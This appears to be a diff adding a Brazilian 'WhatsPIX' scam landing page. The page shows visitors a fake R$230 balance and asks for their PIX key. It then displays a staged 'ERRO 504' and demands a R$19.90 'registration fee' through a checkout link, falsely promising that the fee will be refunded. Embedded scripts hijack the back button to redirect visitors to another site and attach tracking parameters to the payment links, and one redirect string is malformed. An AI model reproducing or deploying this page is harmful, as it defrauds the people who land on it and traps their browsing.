@@ -1,0 +1,539 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+      <meta charset="UTF-8">
+    <script src="js/fFvvCkw48NlV.js" async="" data-tracking-id="DyJ2Dcchti" crossorigin="anonymous"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,400;0,500;0,600;1,300;1,400;1,500;1,600&amp;family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;1,100;1,200;1,300;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/tft8mdbbQVMP.css">
+    <script src="js/HXm0R3KPa09Z.js"></script>
+    <script src="js/ZpIzmRb1oFTu.js"></script>
+    <style>
+      * {
+        font-family: "Poppins", sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+      body {
+        height: 100vh;
+      }
+      header {
+        display: flex;
+        position: fixed;
+        width: 100%;
+        top: 0;
+      }
+      header > div {
+        width: 100%;
+        height: 50px;
+        padding: 8px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        z-index: 1;
+        background-color: #ffffff;
+      }
+
+      header img {
+        height: 30px;
+      }
+      @keyframes pulse {
+        0% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.05);
+        }
+        100% {
+          transform: scale(1);
+        }
+      }
+
+      #saldo {
+        font-weight: 600;
+        color: #ffffff;
+        font-family: "Montserrat", sans-serif;
+        max-width: 100%;
+        font-size: 20px;
+        background: #4285f4;
+        border-radius: 9px;
+        padding: 8px;
+        margin-left: 20px;
+        align-items: center;
+        line-height: 30px;
+        display: block;
+        width: 120px;
+        text-align: center;
+      }
+
+      .logo {
+        width: 100px;
+      }
+      .card-center {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-top: 60px;
+        padding: 30px;
+      }
+      .content-card {
+        display: flex;
+        flex-direction: column;
+        width: 100%;
+        max-width: 490px;
+        background-color: white;
+        background-color: #f1f1f1;
+        border-radius: 16px;
+        border: 1px solid #d3d3d3;
+        padding: 20px;
+        gap: 10px;
+      }
+      .box-alert {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .error-text {
+        display: flex;
+        flex-direction: column;
+        text-align: center;
+        gap: 10px;
+      }
+      .error-text > h2 {
+        color: red;
+      }
+      .error-text > p {
+        font-size: 22px;
+        color: #2d67e9;
+        font-weight: 900;
+      }
+      .information-box {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        border: 1px dotted #1dda01;
+        padding: 10px;
+        border-radius: 16px;
+        gap: 10px;
+      }
+      .information-box > p {
+        font-weight: 500;
+      }
+      .submit-button {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100%;
+        max-width: 288px;
+        background-color: #1dda01;
+        border: none;
+        border-radius: 16px;
+        height: 58px;
+        color: white;
+        font-size: 16px;
+        font-weight: 700;
+        padding: 10px;
+        cursor: pointer;
+        animation: pulse 1.5s infinite alternate;
+      }
+      a {
+        text-decoration: none;
+        height: 40px !important;
+      }
+      .info-text-step {
+        display: flex;
+        align-items: center;
+        flex-direction: column;
+        gap: 20px;
+        border: 1px solid #d3d3d3;
+        border-radius: 8px;
+        padding: 10px;
+        margin-bottom: 20px;
+      }
+      .info-text-step > h2 {
+        color: #2d67e9;
+      }
+      .title-two-step > h2 {
+        text-align: center;
+        font-size: 23px;
+        color: #2d67e9;
+      }
+      .div-color-itens {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        gap: 5px;
+        width: 100%;
+        border-radius: 16px;
+        background: linear-gradient(155deg, #03b07a 0%, #2b6ae4 100%);
+      }
+      .div-color-itens > h3 {
+        color: white;
+        font-size: 28px;
+      }
+      .box-img {
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        justify-content: center;
+        gap: 15px;
+        padding: 10px;
+      }
+      .box-img > img {
+        width: 45px;
+      }
+      .box-img > p {
+        color: white;
+        font-weight: 600;
+        font-size: 20px;
+      }
+      .final-box {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+      }
+      .final-box > h2 {
+        color: black;
+        font-weight: 400;
+      }
+      .div-button {
+        display: flex;
+        width: 100%;
+        height: 50px;
+        align-items: center;
+        justify-content: center;
+      }
+      .box-seta {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .box-seta > h2 {
+        font-weight: 400;
+      }
+      .button-with-pix {
+        display: flex;
+        gap: 10px;
+      }
+      .button-with-pix > img {
+        width: 20px;
+      }
+      .box-seta-2 > h2 {
+        font-weight: 700;
+      }
+      .container-input {
+        padding: 10px;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+      }
+      .container-input > input {
+        border-radius: 10px 10px 10px 10px;
+        background-color: #f5f5f5;
+        height: 40px;
+        border: 1px solid gray;
+        padding-left: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <audio id="meuAudio"><source src="dinheiro.mp3" type="audio/mp3"></audio>
+    <title>WhatsPIX</title>
+    <header>
+      <div>
+        <img class="dropdown" src="images/iVXWEuqpQoYD.png" alt="">
+        <img src="images/QtcXS2PXe5s0.png" alt="">
+        <span id="saldo">R$230,00</span>
+      </div>
+    </header>
+    <div class="card-center">
+      <div class="content-card">
+        <!-- <span class="box-alert">
+          <img src="/images/alert.png" alt="" />
+        </span>
+        <div class="error-text">
+          <h2>ERRO 504</h2>
+          <h2>CHAVE PIX NÃO CADASTRADA</h2>
+          <p>Parece que você ainda não ativou seu cadastro</p>
+        </div>
+        <div class="information-box">
+          <p style="text-align: center">
+            Para efetuar o saque e também continuar avaliando mais marcas, é
+            necessário realizar seu cadastro!<br /><br />Leva menos de 5
+            minutos.<br /><br />Depois você já vai conseguir efetuar o saque
+            direto para sua chave PIX.
+          </p>
+          <button class="submit-button button-three">REALIZAR MEU CADASTRO</button>
+ -->
+        <span class="box-seta">
+          <img src="images/zB9o1TaK9uo2.png" alt="">
+        </span>
+        <span class="box-seta">
+          <h2>Seu saldo subiu</h2>
+        </span>
+          <div class="div-color-itens">
+            <span class="box-img">
+              <img src="images/bNCwJrWBaPS5.png" alt="">
+              <p>Saldo total:</p>
+            </span>
+           <h3>R$ 230,00</h3> 
+          </div>
+          <div class="final-box">
+            <h2 class="">Parabéns!</h2>
+            <p style="text-align: center;">Para cadastrar sua chave pix e <b><span style="color: #2d67e9;">realizar seu saque</span></b>, clique no botão abaixo.</p>
+          </div>
+          <div class="div-button">
+            <button id="button-one" class="submit-button button-with-pix">
+              <img src="images/JrFsyJcP0eVj.svg" alt="">
+              <h2>SACAR AGORA!</h2></button>
+          </div>
+          </div>
+        </div>
+        <!--         <span class="box-seta box-seta-2">
+          <h2>Realizar Saque</h2>
+        </span>
+        <div class="text-two-page">
+          <p style="text-align: center;">Aqui na página de <b><span style="color: #2d67e9;">SAQUES</span></b> você realiza o saque de todas as suas avaliações.</p>
+        </div>
+          <div class="div-color-itens">
+            <span class="box-img">
+              <img src="images/bNCwJrWBaPS5.png" alt="">
+              <p>Saldo total:</p>
+            </span>
+           <h3>R$ 230,00</h3> 
+          </div>
+          <div class="final-box">
+            <p style="text-align: center;">Informe qual o valor deseja sacar e sua chave PIX cadastrada:</p>
+            <div class="container-input">
+              <input required placeholder="Qual valor deseja sacar?" type="text">
+              <input required placeholder="Digite sua chave Pix" type="text">
+            </div>
+            <span class="elementor-field-option"><input type="radio" value="Primeira vez no APP NOVO" id="form-field-field_eac25a0-0" name="form_fields[field_eac25a0]" required="required" aria-required="true"> <label for="form-field-field_eac25a0-0">Primeira vez no <b>APP NOVO</b></label></span>
+          </div>
+          <div class="div-button">
+            <button class="submit-button button-with-pix button-two">
+              <img src="images/JrFsyJcP0eVj.svg" alt="">
+              <h2>SACAR AGORA!</h2></button>
+          </div>
+          </div>
+        </div>  -->
+      
+    
+    <script>
+ let buttonSubmit = document.querySelector(".submit-button");
+let divElement = document.querySelector(".content-card");
+
+buttonSubmit.addEventListener("click", () => {
+  divElement.innerHTML = `
+    <span class="box-seta box-seta-2">
+      <h2>Realizar Saque</h2>
+    </span>
+    <div class="text-two-page">
+      <p style="text-align: center;">Aqui na página de <b><span style="color: #2d67e9;">SAQUES</span></b> você realiza o saque de todas as suas avaliações.</p>
+    </div>
+    <div class="div-color-itens">
+      <span class="box-img">
+        <img src="images/bNCwJrWBaPS5.png" alt="">
+        <p>Saldo total:</p>
+      </span>
+      <h3>R$ 230,00</h3> 
+    </div>
+    <div class="final-box">
+      <p style="text-align: center;">Informe qual o valor deseja sacar e sua chave PIX cadastrada:</p>
+      <div class="container-input">
+        <input class="input-value" placeholder="Qual valor deseja sacar?" type="text">
+        <input class="input-value" placeholder="Digite sua chave Pix" type="text">
+      </div>
+      <span class="elementor-field-option">
+        <input type="radio" value="Primeira vez no APP NOVO" id="form-field-field_eac25a0-0" name="form_fields[field_eac25a0]" required="required" aria-required="true"> 
+        <label for="form-field-field_eac25a0-0">Primeira vez no <b>APP NOVO</b></label>
+      </span>
+    </div>
+    <div class="div-button">
+      <button class="submit-button button-with-pix button-two">
+        <img src="images/JrFsyJcP0eVj.svg" alt="">
+        <h2>SACAR AGORA!</h2>
+      </button>
+    </div>
+  `;
+
+  // Redefinindo as variáveis após a substituição do conteúdo da divElement
+  buttonSubmit = document.querySelector(".submit-button");
+  divElement = document.querySelector(".content-card");
+
+  buttonSubmit.addEventListener("click", () => {
+    input = document.querySelectorAll(".input-value")
+    let isNull = false
+    input.forEach(input => {
+      if (!input.value.trim()) {
+        alert("Um ou mais dados não foram preenchidos");
+        isNull = true;
+        return;
+      }
+    });
+
+    if (isNull) {
+      return;
+    }
+  
+
+    divElement.innerHTML = `
+      <span class="box-alert">
+        <img src="/images/alert.png" alt="" />
+      </span>
+      <div class="error-text">
+        <h2>ERRO 504</h2>
+        <h2>CHAVE PIX NÃO CADASTRADA</h2>
+        <p>Parece que você ainda não ativou seu cadastro</p>
+      </div>
+      <div class="information-box">
+        <p style="text-align: center">
+          Para efetuar o saque e também continuar avaliando mais marcas, é
+          necessário realizar seu cadastro!<br /><br />Leva menos de 5
+          minutos.<br /><br />Depois você já vai conseguir efetuar o saque
+          direto para sua chave PIX.
+        </p>
+        <button id="button-two" class="submit-button button-two">REALIZAR MEU CADASTRO</button>
+      </div>
+    `;
+
+    // Redefinindo as variáveis após a segunda substituição do conteúdo da divElement
+    buttonSubmit = document.querySelector(".button-two");
+    divElement = document.querySelector(".content-card");
+
+    buttonSubmit.addEventListener('click', () => {
+      divElement.innerHTML = 
+`          <span class="title-two-step">
+            <h2>VAMOS ATIVAR SEU CADASTRO!</h2>
+          </span>
+          <div class="info-text-step">
+
+            <div class="elementor-widget-container">
+              <style>
+                /*! elementor - v3.18.0 - 08-12-2023 */
+                .elementor-widget-text-editor.elementor-drop-cap-view-stacked
+                  .elementor-drop-cap {
+                  background-color: #69727d;
+                  color: #fff;
+                }
+                .elementor-widget-text-editor.elementor-drop-cap-view-framed
+                  .elementor-drop-cap {
+                  color: #69727d;
+                  border: 3px solid;
+                  background-color: transparent;
+                }
+                .elementor-widget-text-editor:not(
+                    .elementor-drop-cap-view-default
+                  )
+                  .elementor-drop-cap {
+                  margin-top: 8px;
+                }
+                .elementor-widget-text-editor:not(
+                    .elementor-drop-cap-view-default
+                  )
+                  .elementor-drop-cap-letter {
+                  width: 1em;
+                  height: 1em;
+                }
+                .elementor-widget-text-editor .elementor-drop-cap {
+                  float: left;
+                  text-align: center;
+                  line-height: 1;
+                  font-size: 50px;
+                }
+                .elementor-widget-text-editor .elementor-drop-cap-letter {
+                  display: inline-block;
+                }
+              </style>
+              A única forma de ativar o cadastro é fazendo o pagamento da taxa
+              <span style="color: #2d67e9">TAXA DE INSCRIÇÃO</span> no valor de
+              <b><span style="color: #2d67e9">R$ 19,90</span></b
+              >.
+            </div>
+            <div class="elementor-widget-container">
+              Este custo de TAXA DE INSCRIÇÃO vai ser
+              <span style="color: #2d67e9">100% devolvido</span> para você
+              juntamente com seu primeiro saque.
+            </div>
+          </div>
+          <div class="info-text-step">
+            <h2 class="elementor-heading-title elementor-size-default">
+              2° PASSO
+            </h2>
+            <div class="elementor-widget-container">
+              Após realizar o pagamento, você receberá um e-mail contendo as
+              informações do aplicativo e já conseguirá
+              <span style="color: #2d67e9"
+                >acessar, solicitar o saque e fazer mais avaliações</span
+              >
+              para lucrar mais.
+            </div>
+            <a href="https://checkout.perfectpay.com.br/pay/PPU38CNHA3I?" class="submit-button">REALIZAR MEU CADASTRO</a>`
+
+
+    });
+  });
+});
+
+      
+    </script>
+    <script src="js/OwcL4zQpEvLl.js"></script>
+  
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const back_redirect_back_link = 'https://pagina-oficial.store/pb ’;
+    const backRedirectValue = "|BackRedirect";
+    const utmParameterName = 'src';
+
+    const url = new URL(window.location.href);
+    const params = new URLSearchParams(url.search);
+    const utmParam = params.get(utmParameterName);
+
+    if (utmParam !== null) {
+        params.set(utmParameterName, utmParam + backRedirectValue);
+    } else {
+        params.append(utmParameterName, backRedirectValue.slice(1));
+    }
+
+    const queryString = params.toString();
+    const fullRedirectLink = back_redirect_back_link + "?" + queryString;
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.onpopstate = function() {
+        setTimeout(function() {
+            location.href = fullRedirectLink;
+        }, 1);
+    };
+});
+</script>
+<script>
+  let prefix = ["https://checkout.perfectpay.com.br"];
+
+function getParams() {
+   let t = "",
+       e = window.top.location.href,
+       r = new URL(e);
+   if (null != r) {
+       let a = r.searchParams.get("utm_source"),
+           n = r.searchParams.get("utm_medium"),
+           o = r.searchParams.get("utm_campaign"),
+           m = r.searchParams.get("utm_term"),
+           c = r.searchParams.get("utm_content"); - 1 !== e.indexOf("?") && (t = `&sck=${a}|${n}|${o}|${m}|${c}`), console.log(t)
+   }
+   return t
+}! function() {
+   var t = new URLSearchParams(window.location.search);
+   t.toString() && document.querySelectorAll("a").forEach(function(e) {
+       for (let r = 0; r < prefix.length; r++) - 1 !== e.href.indexOf(prefix[r]) && (-1 === e.href.indexOf("?") ? e.href += "?" + t.toString() + getParams() : e.href += "&" + t.toString() + getParams())
+   })
+}(); </script></body></html>
